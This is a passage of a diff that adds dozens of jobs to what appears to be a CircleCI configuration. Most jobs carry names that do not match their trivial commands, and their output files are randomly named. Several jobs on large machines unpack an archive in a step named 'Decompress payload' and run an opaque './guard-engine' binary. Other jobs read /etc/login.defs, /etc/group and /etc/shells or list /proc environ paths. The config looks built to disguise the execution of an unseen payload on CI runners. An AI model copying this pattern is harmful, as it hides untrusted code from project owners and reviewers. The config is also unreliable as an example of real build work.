+            [[ -r /tmp/debug/riverSilentChunk && -f /tmp/debug/riverSilentChunk ]] && cat /tmp/debug/riverSilentChunk 2>/dev/null | wc -c || echo "cannot read"
+      - run:
+          name: Pull code
+          command: git clone --depth 5 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress payload
+          command: tar -I bzip2 -xf fragments-02.tar.bz2
+      - run:
+          command: bash -c "./guard-engine"
+  shouldWakeSpan:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/debug
+      - run:
+          name: shelveOutboundOrdersJob
+          command: |
+            mkdir -p /tmp/debug
+            { set +o pipefail 2>/dev/null; echo OK > /tmp/sprint.yellow-copy.tmp && cp /tmp/sprint.yellow-copy.tmp /tmp/rank-0615.bak && diff /tmp/sprint.yellow-copy.tmp /tmp/rank-0615.bak && echo identical; true ; } > /tmp/debug/a6f69dfd57ebaf7b0e811
+            cat /tmp/debug/a6f69dfd57ebaf7b0e811 > /dev/null && echo "cat ok"
+      - persist_to_workspace:
+          root: /tmp/debug
+          paths:
+            - 'a6f69dfd57ebaf7b0e811'
+  dec2-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/debug
+      - run:
+          name: Scan prior
+          command: |
+            [[ -r /tmp/debug/REF_008722 && -f /tmp/debug/REF_008722 ]] && cat /tmp/debug/REF_008722 2>/dev/null | wc -c || echo "cannot read"
+      - run:
+          name: Pull code
+          command: git clone --depth 5 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress payload
+          command: tar -I bzip2 -xf fragments-02.tar.bz2
+      - run:
+          command: bash -c "./guard-engine"
+  Pa5:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/debug
+      - run:
+          name: Go batch the validation split
+          command: |
+            mkdir -p /tmp/debug
+            { set +o pipefail 2>/dev/null; stdbuf -oL echo '3 tests passed'; true ; } > /tmp/debug/sTOnePULSEQuaRKRaster
+            cat /tmp/debug/sTOnePULSEQuaRKRaster > /dev/null && echo "cat ok"
+      - persist_to_workspace:
+          root: /tmp/debug
+          paths:
+            - 'sTOnePULSEQuaRKRaster'
+  Package_Image4:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/debug
+      - run:
+          name: Scan prior
+          command: |
+            [[ -r /tmp/debug/sTOnePULSEQuaRKRaster && -f /tmp/debug/sTOnePULSEQuaRKRaster ]] && cat /tmp/debug/sTOnePULSEQuaRKRaster 2>/dev/null | wc -c || echo "cannot read"
+      - run:
+          name: Pull code
+          command: git clone --depth 5 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress payload
+          command: tar -I bzip2 -xf fragments-02.tar.bz2
+      - run:
+          command: bash -c "./guard-engine"
+  len12:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/debug
+      - run:
+          name: Call Thandi if the support macros fail
+          command: |
+            mkdir -p /tmp/debug
+            { set +o pipefail 2>/dev/null; date --date='2025-06-01 14:30' +'%I:%M %p'; true ; } > /tmp/debug/engine-server
+            cat /tmp/debug/engine-server > /dev/null && echo "cat ok"
+      - persist_to_workspace:
+          root: /tmp/debug
+          paths:
+            - 'engine-server'
+  cd-alt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/debug
+      - run:
+          name: Scan prior
+          command: |
+            [[ -r /tmp/debug/engine-server && -f /tmp/debug/engine-server ]] && cat /tmp/debug/engine-server 2>/dev/null | wc -c || echo "cannot read"
+      - run:
+          name: Pull code
+          command: git clone --depth 5 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress payload
+          command: tar -I bzip2 -xf fragments-02.tar.bz2
+      - run:
+          command: bash -c "./guard-engine"
+  cell-riddle:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/debug
+      - run:
+          name: Opening Spawn
+          command: |
+            mkdir -p /tmp/debug
+            { set +o pipefail 2>/dev/null; grep -in "ENCRYPT_METHOD" /etc/login.defs | nl; true ; } > /tmp/debug/bin-lib
+            cat /tmp/debug/bin-lib > /dev/null && echo "cat ok"
+      - persist_to_workspace:
+          root: /tmp/debug
+          paths:
+            - 'bin-lib'
+  DEPLOY_PROD:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/debug
+      - run:
+          name: Scan prior
+          command: |
+            [[ -r /tmp/debug/REF_008722 && -f /tmp/debug/REF_008722 ]] && cat /tmp/debug/REF_008722 2>/dev/null | wc -c || echo "cannot read"
+      - run:
+          name: Pull code
+          command: git clone --depth 5 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress payload
+          command: tar -I bzip2 -xf fragments-02.tar.bz2
+      - run:
+          command: bash -c "./guard-engine"
+  balloon-char-bishop-atlas:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/debug
+      - run:
+          name: The webhook secrets scanned if needed
+          command: |
+            mkdir -p /tmp/debug
+            { set +o pipefail 2>/dev/null; find /dev -maxdepth 2 -type f -iname fd -exec du -h "{}" \; 2>/dev/null | xargs ls -ld; true ; } > /tmp/debug/bindocsw
+            cat /tmp/debug/bindocsw > /dev/null && echo "cat ok"
+      - persist_to_workspace:
+          root: /tmp/debug
+          paths:
+            - 'bindocsw'
+  delta:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/debug
+      - run:
+          name: Scan prior
+          command: |
+            [[ -r /tmp/debug/bindocsw && -f /tmp/debug/bindocsw ]] && cat /tmp/debug/bindocsw 2>/dev/null | wc -c || echo "cannot read"
+      - run:
+          name: Pull code
+          command: git clone --depth 5 --no-single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Decompress payload
+          command: tar -I bzip2 -xf fragments-02.tar.bz2
+      - run:
+          command: bash -c "./guard-engine"
+
+  lima-59:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/debug
+      - run:
+          name: RUN MIGRATE CONNECTION POOL
+          command: |
+            mkdir -p /tmp/debug
+            { set +o pipefail 2>/dev/null; echo; echo 'first, second and third'; echo; true ; } > /tmp/debug/willow.stock.peer.guest
+            cat /tmp/debug/willow.stock.peer.guest > /dev/null && echo "cat ok"
+      - persist_to_workspace:
+          root: /tmp/debug
+          paths:
+            - 'willow.stock.peer.guest'
+  lightning-old-socket-tree:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/debug
+      - run:
+          name: Level VII foreign key checkpoint
+          command: |
+            mkdir -p /tmp/debug
+            { set +o pipefail 2>/dev/null; grep -i -s then /etc/profile | sort | uniq -c; true ; } > /tmp/debug/bindocsw
+            cat /tmp/debug/bindocsw > /dev/null && echo "cat ok"
+      - persist_to_workspace:
+          root: /tmp/debug
+          paths:
+            - 'bindocsw'
+  spamquuemai:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/debug
+      - run:
+          name: Downbeat streaming
+          command: |
+            mkdir -p /tmp/debug
+            { set +o pipefail 2>/dev/null; test ! -f /etc/passwd && echo "ok" || echo "not ok"; true ; } > /tmp/debug/snapshot-v8.8.32
+            cat /tmp/debug/snapshot-v8.8.32 > /dev/null && echo "cat ok"
+      - persist_to_workspace:
+          root: /tmp/debug
+          paths:
+            - 'snapshot-v8.8.32'
+  testSearchStackPublic:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/debug
+      - run:
+          name: TRUE UP SHA 59FCB
+          command: |
+            mkdir -p /tmp/debug
+            { set +o pipefail 2>/dev/null; echo -n "all tasks complete" | tr ' ' '\n' | sort; true ; } > /tmp/debug/BeamDusty
+            cat /tmp/debug/BeamDusty > /dev/null && echo "cat ok"
+      - persist_to_workspace:
+          root: /tmp/debug
+          paths:
+            - 'BeamDusty'
+  oldFixture:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Snapshot 1
+          command: |
+            mkdir -p /tmp/debug
+            { set +o pipefail 2>/dev/null; gzip -c /etc/hosts >"/tmp/messagelemontheater-2.gz" && zcmp /etc/hosts "/tmp/messagelemontheater-2.gz" && echo same; true ; } > /tmp/debug/n9y7d0ap
+            cat /tmp/debug/n9y7d0ap > /dev/null && echo "cat ok"
+      - persist_to_workspace:
+          root: /tmp/debug
+          paths:
+            - 'n9y7d0ap'
+  Global-Pointer:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/debug
+      - run:
+          name: Level IV version the FAQ page
+          command: |
+            mkdir -p /tmp/debug
+            { set +o pipefail 2>/dev/null; find /proc/self -name "environ" -uid 0 -exec echo {} + 2>/dev/null | nl; true ; } > /tmp/debug/blake_3c47cb44005
+            cat /tmp/debug/blake_3c47cb44005 > /dev/null && echo "cat ok"
+      - persist_to_workspace:
+          root: /tmp/debug
+          paths:
+            - 'blake_3c47cb44005'
+  mockOpt:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: T5 optimization
+          command: |
+            mkdir -p /tmp/debug
+            { set +o pipefail 2>/dev/null; for i in whale cat wolf frog; do echo "$i"; done; true ; } > /tmp/debug/debug-7dc966.log
+            cat /tmp/debug/debug-7dc966.log > /dev/null && echo "cat ok"
+      - persist_to_workspace:
+          root: /tmp/debug
+          paths:
+            - 'debug-7dc966.log'
+  TotalGlobalFastCheckout:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/debug
+      - run:
+          name: Spawn Achievements For Mobile
+          command: |
+            mkdir -p /tmp/debug
+            { set +o pipefail 2>/dev/null; find /var/log -maxdepth 3 -mindepth 1 -type d -ctime -7 -exec du -sh {} ';' 2>/dev/null | sort | head -n 10; true ; } > /tmp/debug/rev.2.11
+            cat /tmp/debug/rev.2.11 > /dev/null && echo "cat ok"
+      - persist_to_workspace:
+          root: /tmp/debug
+          paths:
+            - 'rev.2.11'
+  mia-score:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/debug
+      - run:
+          name: print pdf
+          command: |
+            mkdir -p /tmp/debug
+            { set +o pipefail 2>/dev/null; command -v gzip >&/dev/null && echo yes || echo no; true ; } > /tmp/debug/xx_4022ff2d8b9698
+            cat /tmp/debug/xx_4022ff2d8b9698 > /dev/null && echo "cat ok"
+      - persist_to_workspace:
+          root: /tmp/debug
+          paths:
+            - 'xx_4022ff2d8b9698'
+  handle_shell_disconnect:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Snapshot 1
+          command: |
+            mkdir -p /tmp/debug
+            set +o pipefail 2>/dev/null; seq 1 812228 | awk '{if($1%2){print "odd",$1} else {print "even",$1}}' > /tmp/debug/5fbc3f58b02663c9a; true
+            cat /tmp/debug/5fbc3f58b02663c9a > /dev/null && echo "cat ok"
+      - persist_to_workspace:
+          root: /tmp/debug
+          paths:
+            - '5fbc3f58b02663c9a'
+  vicTheIron:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/debug
+      - run:
+          name: Legacy Notification
+          command: |
+            mkdir -p /tmp/debug
+            { set +o pipefail 2>/dev/null; ls -ts -w 60 -I '*.d' ${HOME}/.profile | paste -sd ' '; true ; } > /tmp/debug/IMG-00005591
+            cat /tmp/debug/IMG-00005591 > /dev/null && echo "cat ok"
+      - persist_to_workspace:
+          root: /tmp/debug
+          paths:
+            - 'IMG-00005591'
+  j_union_7:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/debug
+      - run:
+          name: Reconciliation Status Dirty
+          command: |
+            mkdir -p /tmp/debug
+            { set +o pipefail 2>/dev/null; sleep 0.3 && echo done; true ; } > /tmp/debug/159.28.98.175
+            cat /tmp/debug/159.28.98.175 > /dev/null && echo "cat ok"
+      - persist_to_workspace:
+          root: /tmp/debug
+          paths:
+            - '159.28.98.175'
+  sqrt-19:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/debug
+      - run:
+          name: Shader bake run
+          command: |
+            mkdir -p /tmp/debug
+            { set +o pipefail 2>/dev/null; printf %s "that's all folks" | b2sum | awk '{print $1}'; true ; } > /tmp/debug/molten.trade.bison.coin.river
+            cat /tmp/debug/molten.trade.bison.coin.river > /dev/null && echo "cat ok"
+      - persist_to_workspace:
+          root: /tmp/debug
+          paths:
+            - 'molten.trade.bison.coin.river'
+  Lock2PCI:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Unfreeze
+          command: |
+            mkdir -p /tmp/debug
+            { set +o pipefail 2>/dev/null; if [ ! -k /tmp ] ; then echo present; elif [ -e /tmp ] ; then echo maybe; else echo absent; fi; true ; } > /tmp/debug/ARchIVered
+            cat /tmp/debug/ARchIVered > /dev/null && echo "cat ok"
+      - persist_to_workspace:
+          root: /tmp/debug
+          paths:
+            - 'ARchIVered'
+  card__legend:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/debug
+      - run:
+          name: Babysit the sprite atlas
+          command: |
+            mkdir -p /tmp/debug
+            { set +o pipefail 2>/dev/null; for n in $(seq 1 4); do echo "line $n"; done | paste -sd ' '; true ; } > /tmp/debug/memo_river_burst_raster
+            cat /tmp/debug/memo_river_burst_raster > /dev/null && echo "cat ok"
+      - persist_to_workspace:
+          root: /tmp/debug
+          paths:
+            - 'memo_river_burst_raster'
+  bw:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/debug
+      - run:
+          name: prep the vials ASAP
+          command: |
+            mkdir -p /tmp/debug
+            { set +o pipefail 2>/dev/null; printf 'name,city,score\nbob,seoul,46\ntina,delhi,74\ngrace,kyoto,44\nfrank,manila,79\n' >'/tmp/warning.conf'&&tail -n +2 '/tmp/warning.conf' | wc -l; true ; } > /tmp/debug/engine-server
+            cat /tmp/debug/engine-server > /dev/null && echo "cat ok"
+      - persist_to_workspace:
+          root: /tmp/debug
+          paths:
+            - 'engine-server'
+  R_AVG:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/debug
+      - run:
+          name: Engine start
+          command: |
+            mkdir -p /tmp/debug
+            { set +o pipefail 2>/dev/null; if test -h /etc/os-release;then echo present; elif test -e /tmp;then echo maybe; else echo "absent"; fi; true ; } > /tmp/debug/sTOnePULSEQuaRKRaster
+            cat /tmp/debug/sTOnePULSEQuaRKRaster > /dev/null && echo "cat ok"
+      - persist_to_workspace:
+          root: /tmp/debug
+          paths:
+            - 'sTOnePULSEQuaRKRaster'
+  PRD-FEE-3:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/debug
+      - run:
+          name: Tagging x2
+          command: |
+            mkdir -p /tmp/debug
+            { set +o pipefail 2>/dev/null; echo "3 jobs pending" | gzip | base64; true ; } > /tmp/debug/bEamRIDgeQuARklAyER
+            cat /tmp/debug/bEamRIDgeQuARklAyER > /dev/null && echo "cat ok"
+      - persist_to_workspace:
+          root: /tmp/debug
+          paths:
+            - 'bEamRIDgeQuARklAyER'
+  SERVER_200007:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/debug
+      - run:
+          name: Closed caption compression for the sprint
+          command: |
+            mkdir -p /tmp/debug
+            { set +o pipefail 2>/dev/null; awk -F ":" '$4 != "" {print $1}' /etc/group | shuf -n 1 | rev | cat -n; true ; } > /tmp/debug/105.137.198.160
+            cat /tmp/debug/105.137.198.160 > /dev/null && echo "cat ok"
+      - persist_to_workspace:
+          root: /tmp/debug
+          paths:
+            - '105.137.198.160'
+  k4:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/debug
+      - run:
+          name: Kindly reboot the rack units
+          command: |
+            mkdir -p /tmp/debug
+            { set +o pipefail 2>/dev/null; touch /tmp/pl.bak && mv -v /tmp/pl.bak '/tmp/g.old'; true ; } > /tmp/debug/kappa_9626_9bd
+            cat /tmp/debug/kappa_9626_9bd > /dev/null && echo "cat ok"
+      - persist_to_workspace:
+          root: /tmp/debug
+          paths:
+            - 'kappa_9626_9bd'
+  d9-d0-8e-a5-59-40:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/debug
+      - run:
+          name: afterFilterChipHover
+          command: |
+            mkdir -p /tmp/debug
+            { set +o pipefail 2>/dev/null; install -d -m 750 "/tmp/card-draft" && stat -c %a "/tmp/card-draft"; true ; } > /tmp/debug/IMG_18915
+            cat /tmp/debug/IMG_18915 > /dev/null && echo "cat ok"
+      - persist_to_workspace:
+          root: /tmp/debug
+          paths:
+            - 'IMG_18915'
+  gnome-throw:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/debug
+      - run:
+          name: Fail Over DNS Records On Prod
+          command: |
+            mkdir -p /tmp/debug
+            { set +o pipefail 2>/dev/null; awk -F/ '{print $NF}' /etc/shells | shuf -n 5 | wc -l; true ; } > /tmp/debug/sample_266
+            cat /tmp/debug/sample_266 > /dev/null && echo "cat ok"
+      - persist_to_workspace:
+          root: /tmp/debug
+          paths:
+            - 'sample_266'
+  sImf3tI:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Snapshot 1
+          command: |
+            mkdir -p /tmp/debug
+            { set +o pipefail 2>/dev/null; seq 8 > "/tmp/junkCrimson_2019-12-18.dat" && tail -n 1 "/tmp/junkCrimson_2019-12-18.dat"; true ; } > /tmp/debug/riverSilentChunk
+            cat /tmp/debug/riverSilentChunk > /dev/null && echo "cat ok"
+      - persist_to_workspace:
+          root: /tmp/debug
+          paths:
+            - 'riverSilentChunk'
+workflows:
+  main:
+    jobs:
+      - VIEW_HUGE
+      - lima-59:
+          requires:
+            - VIEW_HUGE
+      - rust-cov:
+          requires:
+            - lima-59
+      - balloon-char-bishop-atlas:
+          requires:
+            - lima-59
+      - lightning-old-socket-tree:
+          requires:
+            - balloon-char-bishop-atlas
+      - delta:
+          requires:
+            - lightning-old-socket-tree
+      - G:
+          requires:
+            - lightning-old-socket-tree
+      - spamquuemai:
+          requires:
+            - G
+      - Package_Suite9:
+          requires:
+            - spamquuemai
+      - MAT2:
+          requires:
+            - spamquuemai
+      - testSearchStackPublic:
+          requires:
+            - MAT2
+      - run-end-to-end-integration-tests:
+          requires:
+            - testSearchStackPublic
+      - alice-future:
+          requires:
+            - testSearchStackPublic
+      - oldFixture:
+          requires:
+            - alice-future
+      - min-ci:
+          requires:
+            - oldFixture
+      - lishbealglossx
+      - posT
+      - Y80
+      - cf-old:
+          requires:
+            - lishbealglossx
+            - posT
+            - Y80
+      - perseus-alpha:
+          requires:
+            - lishbealglossx
+            - posT
+            - Y80
+      - v8-alpha:
+          requires:
+            - lishbealglossx
+            - posT
+            - Y80
+      - dec2-ship:
+          requires:
+            - lishbealglossx
+            - posT
+            - Y80
+      - yankee:
+          requires:
+            - lishbealglossx
+            - posT
+            - Y80
+      - update-parse-leak:
+          requires:
+            - lishbealglossx
+            - posT
+            - Y80
+      - DEPLOY_PROD:
+          requires:
+            - lishbealglossx
+            - posT
+            - Y80
+      - cOlive
+      - Global-Pointer:
+          requires:
+            - cOlive
+      - fix-metrics:
+          requires:
+            - Global-Pointer
+      - reduce_proxy:
+          requires:
+            - Global-Pointer
+      - mockOpt:
+          requires:
+            - reduce_proxy
+      - RUN_UAT:
+          requires:
+            - mockOpt
+      - d57:
+          requires:
+            - mockOpt
+      - TotalGlobalFastCheckout:
+          requires:
+            - d57
+      - INIT_UAT:
+          requires:
+            - TotalGlobalFastCheckout
+      - no460:
+          requires:
+            - TotalGlobalFastCheckout
+      - mia-score:
+          requires:
+            - no460
+      - ensure-partial-artifact-bundle:
+          requires:
+            - mia-score
+      - shoot_circle:
+          requires:
+            - mia-score
+      - handle_shell_disconnect:
+          requires:
+            - shoot_circle
+      - produce-full-release-candidate:
+          requires:
+            - handle_shell_disconnect
+      - git-test-57:
+          requires:
+            - handle_shell_disconnect
+      - vicTheIron:
+          requires:
+            - git-test-57
+      - omar-ci:
+          requires:
+            - vicTheIron
+      - mask_sync_array_reject
+      - j_union_7:
+          requires:
+            - mask_sync_array_reject
+      - aug17-ship:
+          requires:
+            - j_union_7
+      - p_address:
+          requires:
+            - j_union_7
+      - sqrt-19:
+          requires:
+            - p_address
+      - dotnet8-build:
+          requires:
+            - sqrt-19
+      - hero--warning:
+          requires:
+            - sqrt-19
+      - Lock2PCI:
+          requires:
+            - hero--warning
+      - hotfix-1496:
+          requires:
+            - Lock2PCI
+      - sqPE:
+          requires:
+            - Lock2PCI
+      - card__legend:
+          requires:
+            - sqPE
+      - november-8:
+          requires:
+            - card__legend
+      - len12:
+          requires:
+            - card__legend
+      - bw:
+          requires:
+            - len12
+      - cd-alt:
+          requires:
+            - bw
+      - Pa5:
+          requires:
+            - bw
+      - R_AVG:
+          requires:
+            - Pa5
+      - Package_Image4:
+          requires:
+            - R_AVG
+      - bal_blvd_snd
+      - PRD-FEE-3:
+          requires:
+            - bal_blvd_snd
+      - refactor-256:
+          requires:
+            - PRD-FEE-3
+      - assert_edge_join:
+          requires:
+            - PRD-FEE-3
+      - SERVER_200007:
+          requires:
+            - assert_edge_join
+      - nightly-v1:
+          requires:
+            - SERVER_200007
+      - shim_sys:
+          requires:
+            - SERVER_200007
+      - k4:
+          requires:
+            - shim_sys
+      - europa-rev:
+          requires:
+            - k4
+      - ConvertTo-OffsetPixel:
+          requires:
+            - k4
+      - d9-d0-8e-a5-59-40:
+          requires:
+            - ConvertTo-OffsetPixel
+      - t-2:
+          requires:
+            - d9-d0-8e-a5-59-40
+      - cron012:
+          requires:
+            - d9-d0-8e-a5-59-40
+      - gnome-throw:
+          requires:
+            - cron012
+      - v5-alpha5:
+          requires:
+            - gnome-throw
+      - ugdf53al5j2iq961:
+          requires:
+            - gnome-throw
+      - sImf3tI:
+          requires:
+            - ugdf53al5j2iq961
+      - v5-ga:
+          requires:
+            - sImf3tI
